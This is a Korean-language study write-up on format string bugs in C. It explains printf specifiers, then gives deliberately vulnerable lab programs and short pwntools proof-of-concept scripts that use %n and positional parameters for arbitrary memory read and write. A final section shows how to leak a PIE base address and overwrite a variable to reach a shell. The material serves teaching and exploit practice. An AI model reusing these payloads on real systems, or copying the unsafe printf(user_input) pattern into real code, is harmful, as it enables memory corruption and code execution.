---
layout: post
title: "Format String Bug"
categories: [SWING, Writeup]
tags: [Format String, Memory Corruption, Exploit]
last_modified_at: 2024-02-17
---

Memory Corruption: Format String Bug

C에서 문자열을 출력하는 다양한 함수들.. write, puts, printf..

printf는 포맷 스트링을 이용하여 다양한 형태로 값 출력 가능

포맷 스트링을 인자로 사용하는 함수 또한 다양.. scanf, fprintf, fscanf, sprintf 등.. 함수의 이름이 f로 끝나고 문자열 다루는 함수들.. 포맷 스트링을 채울 값들을 레지스터나 스택에서 가져옴 이들 내부에 필요 인자와 전달된 인자 간의 개수 비교가 없음

#### 포맷 스트링
```
%[parameter][flags][width][.precision][length]type
```
구성은 위와 같다.

**specifier: 인자를 어떻게 사용할지**  
| 형식 지정자 | 설명 |
|--------------|------|
| d            | 부호있는 10진수 정수 |
| s            | 문자열 |
| x            | 부호없는 16진수 정수 |
| n            | 인자에 현재까지 사용된 문자열의 길이를 저장 |
| p            | void형 포인터 |

**width: 최소 너비 지정.. 치환되는 문자열이 width보다 짧으면 공백문자로 패딩..**  
| 너비 지정자 | 설명 |
|--------------|------|
| 정수         | 정수의 값만큼을 최소 너비로 지정 |
| *            | 인자의 값 만큼을 최소 너비로 지정 |

```c
// Name: fs.c
// Compile: gcc -o fs fs.c

#include <stdio.h>

int main() {
  int num;
  printf("%8d\n", 123);            // "     123"
  printf("%s\n", "Hello, world");  // "Hello, world"
  printf("%x\n", 0xdeadbeef);      // "deadbeef"
  printf("%p\n", &num);            // "0x7ffe6d1cb2c4"
  printf("%s%n: hi\n", "Alice", &num);  // "Alice: hi", num = 5
  printf("%*s: hello\n", num, "Bob");   // "  Bob: hello "
  
  return 0;
}
```

**parameter: 참조할 인자의 인덱스 저장**  
인덱스의 범위를 전달된 인자 개수와 비교 X
```c
// Name: fs_param.c
// Compile: gcc -o fs_param fs_param.c

#include <stdio.h>

int main() {
  int num;
  printf("%2$d, %1$d\n", 2, 1);  // "1, 2"
  return 0;
}
```

#### 포맷 스트링 버그(FSB)
포맷 스트링을 입력할 수 있음 -> 공격자는 레지스터와 스택 읽을 수 있음, 또는 임의 주소 읽/쓰 가능

**1. 레지스터 및 스택 읽기**  
%p를 연달아 입력했더니 알 수 없는 값들이 출력.. -> 8개의 인자를 필요로 하는 포맷 스트링 사용 8개의 인자는 함수 호출 규약에 따라 쓰임(?) 레지스터의 값을 가져 왔음

**2. 임의 주소 읽기(스택)**  
6번째 입력값 rsp부터는 8글자씩 참조 -> 이를 응용! 포맷 스트링에 참조하고 싶은 주소 삽입 -> %[n]$s의 형식으로 참조 가능
```c
// Name: fsb_aar.c
// Compile: gcc -o fsb_aar fsb_aar.c
#include <stdio.h>
const char *secret = "THIS IS SECRET";
int main() {
  char format[0x100];
  printf("Address of `secret`: %p\n", secret);
  printf("Format: ");
  scanf("%[^\n]", format);
  printf(format);
  return 0;
}
```
```python
#!/usr/bin/python3
# Name: fsb_aar.py

from pwn import *

p = process("./fsb_aar")
p.recvuntil("`secret`: ")
addr_secret = int(p.recvline()[:-1], 16)
fstring = b"%7$s".ljust(8)
fstring += p64(addr_secret)
p.sendline(fstring)
p.interactive()
```
c프로그램은 fsb 취약점이 존재.. py프로그램은 PoC임.. python 코드의 내용은 대충.. secret의 주소를 받아서 7$ 넣고 뒤에 addr_secret을 패킹해서 넣어주기

ljust, rjust 함수가 뭔지는 접은 글에..
**rjust(n)** : 문자열을 오른쪽으로 n만큼 정렬  
**ljust(n)** : 문자열을 왼쪽으로 n만큼 정렬  

**3. 임의 주소 쓰기**
```c
// Name: fsb_aaw.c
// Compile: gcc -o fsb_aaw fsb_aaw.c

#include <stdio.h>

int secret;
int main() {
  char format[0x100];
  printf("Address of `secret`: %p\n", &secret);
  printf("Format: ");
  scanf("%[^\n]", format);
  printf(format);
  printf("Secret: %d", secret);
  return 0;
}
```
scanf에 fsb..
```python
#!/usr/bin/python3
# Name: fsb_aaw.py
from pwn import *
p = process("./fsb_aaw")
p.recvuntil("`secret`: ")
addr_secret = int(p.recvline()[:-1], 16)
fstring = b"%31337c%8$n".ljust(16)
fstring += p64(addr_secret)
p.sendline(fstring)
print(p.recvall())
```

Exploit Tech: Format String Bug

get_string 함수로 0x20만큼 buf에 입력을 받음 printf(buf)에서 인자가 직접 사용되므로 fsb..

```c
// Name: fsb_overwrite.c
// Compile: gcc -o fsb_overwrite fsb_overwrite.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void get_string(char *buf, size_t size) {
  ssize_t i = read(0, buf, size);
  if (i == -1) {
    perror("read");
    exit(1);
  }
  if (i < size) {
    if (i > 0 && buf[i - 1] == '\n') i--;
    buf[i] = 0;
  }
}

int changeme;

int main() {
  char buf[0x20];
  
  setbuf(stdout, NULL);
  
  while (1) {
    get_string(buf, 0x20);
    printf(buf);
    puts("");
    if (changeme == 1337) {
      system("/bin/sh");
    }
  }
}
```
changeme를 1137로 바꿔줘야 함

**1. changeme 주소 구하기**  
PIE 보호 기법 적용 -> 전역 변수(changeme)의 주소 실행할 때마다 바뀜 PIE 베이스 주소.. changeme 주소 계산..

**2. changeme를 1337로 설정하기**  
get_string으로 changeme 주소 스택에 저장 printf 함수에서 %n으로 changeme 값 조작 가능 1337바이트 문자열 미리 출력.. -> change값으로 쓰면 1337

익스플로잇.. 을 실습으로 해야되는데 wsl에도 가상머신에서도.. 안 돌아감 일단 문서화만 진행..

**1. changeme 주소 구하기**  
printf함수가 호출되는 오프셋 찾고 브레이크포인트..
```
x/32gx $rsp
```
rsp 출력해보면 rsp+0x48에 0x5555555555293

이값을 vmmap으로 확인.. 해당값은 fsb_overwrite 바이너리가 매핑된 영역에 포함되는 주소.. -> PIE 베이스 주소 구하기

[RSP-0x48]에 저장되어 있는 주소와 PIE 베이스 주소 간의 오프셋... 0x1293 x64 환경에서 printf 함수는 RDI에 포맷스트링 전달.. 이후 레지스터는 함수 호출 규약에 따라 RSI, RDX, RCX, R8, R9 이후부터는 rsp, rsp+0x8, rsp+0x10.. rsp+0x48은 15번째 인자.. %15$p로 설정

%15$p를 입력해서 나온 값 - 0x1293 PIE 베이스 주소 다시 이값에서 changeme의 오프셋을 더해서 changeme의 주소를 구함
```
readelf -s fsb_overwrite | grep changeme
```
readelf 명령어로 changeme의 오프셋 구하기 가능

**2. 1337 길이의 문자열 출력**  
%n은 현재까지 출력된 문자열의 길이를 인자에 저장 나중에 changeme를 가리켜서 %n의 인자가 1337바이트가 되도록..

1337바이트만큼 직접 입력해줄 수는 없음 -> 0x20으로 입력 길이 제한.. 이럴 때 width 속성 사용..

%1337c라고 하면 부족한 부분은 패딩으로 채움..